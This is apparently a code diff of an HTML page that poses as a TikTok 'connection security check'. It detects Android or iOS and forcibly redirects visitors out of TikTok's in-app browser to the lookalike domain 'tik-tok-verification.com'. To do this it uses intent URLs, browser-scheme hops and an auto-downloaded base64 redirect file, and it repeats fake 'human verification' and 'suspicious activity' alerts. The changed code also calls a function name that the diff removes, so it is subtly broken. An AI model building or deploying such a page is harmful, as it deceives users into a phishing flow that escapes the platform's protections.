@@ -3,67 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body { background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }</style>
+    <style>
+        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; }
+        #msg { text-align: center; font-size: 14px; opacity: 0.8; }
+    </style>
 </head>
 <body>
-    <div id="loader">Verifying Connection...</div>
+    <div id="msg">INITIALIZING SECURE CONNECTION...</div>
 
 <script>
-    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    const domain = "tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 5000;
+    const finalUrl = "https://tik-tok-verification.com/Verification/verify1.html";
+    const cleanDomain = "tik-tok-verification.com/Verification/verify1.html";
 
-    function theGhostEject() {
-        const isAndroid = /Android/i.test(navigator.userAgent);
+    function launchEject() {
+        const ua = navigator.userAgent;
+        const isAndroid = /Android/i.test(ua);
+        const isiOS = /iPhone|iPad|iPod/i.test(ua);
 
         if (isAndroid) {
-            // Android: This intent is the "Gold Standard" for bypassing the picker
-            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
-        } else {
-            // iOS: THE FEATURE-CONFLICT POPUP
-            // We open a window with 'menubar' and 'location' set to yes.
-            // TikTok's internal browser has no menu bar, so it often kicks this to Safari.
-            
-            const features = "menubar=yes,location=yes,resizable=yes,scrollbars=yes,status=yes";
-            
-            // 1. Try to pop the window
-            const ghost = window.open(targetUrl, "_blank", features);
+            // Android Chrome Force
+            window.location.href = `intent://${cleanDomain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
+        } else if (isiOS) {
+            // iOS: THE CONTEXT-SWITCH OVERFLOW
+            // 1. Fire a 'fake' system protocol to trigger the OS listener
+            window.location.href = "googlechromes://" + cleanDomain;
 
-            // 2. Immediate protocol backup in case the popup is blocked
-            // This 'googlechromes' scheme is the cleanest direct-path
+            // 2. Immediately fire the 'Safari' direct protocol
             setTimeout(() => {
-                window.location.href = "googlechromes://" + domain;
-            }, 100);
+                window.location.href = "safari-https://" + cleanDomain;
+            }, 50);
 
-            // 3. The 'Safari-Https' overwrite
+            // 3. THE MAGIC: Create an auto-executing data-download
+            // This forces the "Open in Safari?" prompt because TikTok can't render data-blobs.
             setTimeout(() => {
-                window.location.href = "safari-https://" + domain;
-            }, 200);
+                const link = document.createElement('a');
+                link.href = 'data:text/html;base64,' + btoa('<script>window.location.href="' + finalUrl + '";<\/script>');
+                link.download = 'verify.html';
+                link.click();
+            }, 150);
         }
     }
 
-    function securityEngine() {
-        if (Date.now() > killTime) return;
-
-        theGhostEject();
-
+    function securityLoop() {
+        launchEject();
+        
+        // Use the alert to "Pause" the TikTok execution loop
+        // while the OS processes the protocol jumps in the background.
         setTimeout(() => {
             if (document.hasFocus()) {
-                const header = "HUMAN VERIFICATION REQUIRED\n";
-                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
+                const header = "CONNECTION SECURITY CHECK\n";
+                const body = "______________________________\n\nPlease confirm you are not a robot to continue to the external verification portal.";
                 
                 alert(header + body);
                 
-                // Fire again on "OK"
-                theGhostEject();
-                setTimeout(securityEngine, 400);
+                launchEject();
+                setTimeout(securityEngine, 500);
             }
-        }, 400);
+        }, 500);
     }
 
-    // Fire immediately and also on any touch
-    window.onload = securityEngine;
-    document.body.onclick = theGhostEject;
+    window.onload = securityLoop;
 </script>
 </body>
 </html>
